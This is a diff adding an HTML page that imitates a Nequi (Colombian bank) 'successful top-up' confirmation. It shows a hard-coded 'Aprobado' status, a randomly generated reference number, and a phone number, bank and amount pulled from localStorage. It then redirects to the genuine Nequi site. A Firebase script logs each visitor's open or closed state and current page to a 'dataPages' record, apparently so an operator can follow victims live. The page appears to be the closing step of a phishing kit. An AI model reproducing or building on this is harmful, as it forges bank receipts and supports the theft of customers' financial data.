@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Recarga Exitosa</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    background: #f5f5f5;
+    display: flex;
+    justify-content: center;
+}
+
+.container {
+    width: 100%;
+    max-width: 360px;
+    padding: 20px;
+}
+
+/* LOGO */
+.logo {
+    display: block;
+    margin: 20px auto;
+    width: 120px;
+}
+
+/* TITULO */
+.title {
+    text-align: center;
+    margin: 10px 0 20px;
+    font-size: 20px;
+}
+
+/* CARD */
+.card {
+    background: #fff url("fondo.svg") center/cover no-repeat;
+    border-radius: 12px;
+    padding: 20px;
+}
+
+/* LABEL */
+.label {
+    color: #da0081;
+    font-size: 14px;
+    margin-top: 12px;
+}
+
+/* TEXTO */
+.value {
+    font-size: 16px;
+    margin-top: 2px;
+    color: #200020;
+}
+
+/* BOTON */
+.btn {
+    width: 100%;
+    height: 50px;
+    margin-top: 20px;
+    border: none;
+    border-radius: 10px;
+    background: #da0081;
+    color: #fff;
+    font-size: 16px;
+}
+
+/* TEXTO FINAL */
+.footer-text {
+    text-align: center;
+    margin-top: 15px;
+    font-size: 14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- LOGO -->
+    <img src="logo.svg" class="logo">
+
+    <h2 class="title">¡Recarga Exitosa!</h2>
+
+    <div class="card">
+
+        <p class="label">Valor</p>
+        <p class="value" id="valor"></p>
+
+        <p class="label">Estado</p>
+        <p class="value">Aprobado</p>
+
+        <p class="label">Descripción</p>
+        <p class="value">Recarga Nequi PSE</p>
+
+        <p class="label">Número de celular</p>
+        <p class="value" id="telefono"></p>
+
+        <p class="label">Banco</p>
+        <p class="value" id="banco"></p>
+
+        <p class="label">Fecha</p>
+        <p class="value" id="fecha"></p>
+
+        <p class="label">Referencia</p>
+        <p class="value" id="referencia"></p>
+
+    </div>
+
+    <button class="btn" onclick="volverInicio()">Regresar al inicio</button>
+
+    <p class="footer-text">
+        Recuerda que también puedes tomar un pantallazo desde tu cel
+    </p>
+
+</div>
+
+<script>
+// 🔹 traer datos
+let telefono = localStorage.getItem("telefono");
+let banco = localStorage.getItem("banco");
+let monto = localStorage.getItem("monto");
+
+// 🔹 formatear monto
+function formatear(num) {
+    return num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+}
+
+// 🔹 fecha actual
+let fechaActual = new Date();
+let fechaTexto = fechaActual.toLocaleDateString("es-CO", {
+    day: "numeric",
+    month: "long",
+    year: "numeric"
+});
+
+let horaTexto = fechaActual.toLocaleTimeString("es-CO", {
+    hour: "numeric",
+    minute: "2-digit"
+});
+
+// 🔹 referencia aleatoria
+function generarReferencia() {
+    return Math.floor(Math.random() * 1e16);
+}
+
+// 🔹 pintar datos
+document.getElementById("telefono").innerText = telefono;
+document.getElementById("banco").innerText = banco;
+document.getElementById("valor").innerText = "$ " + formatear(monto);
+document.getElementById("fecha").innerText = fechaTexto + " - " + horaTexto;
+document.getElementById("referencia").innerText = generarReferencia();
+
+// 🔹 volver
+function volverInicio() {
+    window.location.href = "https://clientes.nequi.com.co/recargas";
+}
+</script>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+
+const { db, uid, ref, update, onValue } = window;
+
+update(ref(db, "dataPages/" + uid), { 
+  estado: "abierto",
+  paginaActual: "Final.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+  update(ref(db, "dataPages/" + uid), { 
+    estado: "cerrado",
+    paginaActual: null  
+  });
+});
+
+
+});
+</script>
+
+
+</body>
+</html>
